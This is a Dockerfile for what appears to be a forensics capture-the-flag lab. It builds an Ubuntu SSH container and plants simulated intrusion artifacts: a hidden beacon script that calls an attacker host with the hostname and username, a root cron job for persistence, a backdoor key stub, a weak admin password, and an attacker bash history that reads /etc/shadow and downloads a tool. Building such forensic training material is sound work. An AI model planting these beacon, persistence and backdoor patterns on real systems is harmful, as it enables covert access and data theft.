FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y \
    openssh-server cron bash curl \
    && rm -rf /var/lib/apt/lists/*

# Legitimate user
RUN useradd -m -s /bin/bash admin && echo 'admin:admin' | chpasswd
RUN mkdir /run/sshd

# ── Malware artifacts (simulate post-compromise state) ─────────────────────

# C2 beacon script hidden in /tmp
RUN mkdir -p /tmp/.hidden/
RUN printf '#!/bin/bash\n# Simulated C2 beacon — educational artifact\ncurl -s "http://10.13.37.1/beacon?id=$(hostname)&user=$(whoami)" > /dev/null 2>&1\n' \
    > /tmp/.hidden/c2_client
RUN chmod +x /tmp/.hidden/c2_client

# Fake malicious process marker
RUN mkdir -p /proc_sim
RUN echo 'kworker_malicious [pid: 1337]' > /proc_sim/suspicious_process.txt
RUN echo 'Simulated malicious process name disguised as kernel worker' \
    >> /proc_sim/suspicious_process.txt

# Persistence via malicious cron (world-readable to assist forensic analysis)
RUN printf '# Added by attacker — runs every 5 min\n*/5 * * * * root /tmp/.hidden/c2_client\n' \
    > /etc/cron.d/updates
RUN chmod 644 /etc/cron.d/updates

# Malicious SSH authorized_keys (attacker's backdoor public key stub)
RUN mkdir -p /root/.ssh
RUN echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3attacker_backdoor_key_stub== attacker@c2' \
    > /root/.ssh/authorized_keys
RUN chmod 600 /root/.ssh/authorized_keys

# Attacker bash history at root
RUN printf 'id\nwhoami\ncat /etc/passwd\ncat /etc/shadow\nssh admin@192.168.1.2\ntar czf /tmp/data.tar.gz /home\ncurl -o /tmp/.hidden/c2_client http://10.13.37.1/tools/c2\nchmod +x /tmp/.hidden/c2_client\ncrontab -e\n' \
    > /root/.bash_history

# Exfil artifact
RUN echo 'Simulated exfiltrated data — passwords, SSH keys, /etc/shadow dump' \
    > /tmp/data.tar.gz.txt

# Forensic challenge flag
RUN echo 'FLAG{FORENSIC_INVESTIGATION_COMPLETE}' > /root/flag.txt
RUN chmod 600 /root/flag.txt

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D", "-e"]
